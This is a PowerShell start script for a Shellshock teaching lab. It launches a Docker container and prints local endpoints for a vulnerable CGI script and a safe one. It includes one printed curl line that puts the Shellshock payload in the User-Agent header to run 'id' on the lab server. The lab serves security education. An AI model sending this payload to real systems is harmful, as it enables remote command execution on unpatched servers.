# ==============================================================================
# Lab 05 — Shellshock Vulnerability Lab: Start Script (Windows PowerShell)
# ==============================================================================

Write-Host "[Lab 05] Shellshock Vulnerability Lab — Starting Container" -ForegroundColor White
docker compose up -d
Write-Host ""
docker compose ps
Write-Host ""
Write-Host "Lab 05 is running." -ForegroundColor Green
Write-Host ""
Write-Host "  Vulnerable CGI endpoint:"
Write-Host "    http://localhost:10086/cgi-bin/vul.cgi"
Write-Host ""
Write-Host "  Safe CGI endpoint (for comparison):"
Write-Host "    http://localhost:10086/cgi-bin/safe.cgi"
Write-Host ""
Write-Host "  Quick exploit test (run in PowerShell):"
Write-Host '    curl.exe -A "() { :; }; echo; echo Content-Type: text/plain; echo; id" http://localhost:10086/cgi-bin/vul.cgi'
Write-Host ""
Write-Host "  Container shell access:"
Write-Host "    docker exec -it shellshock-10.9.0.80 bash"
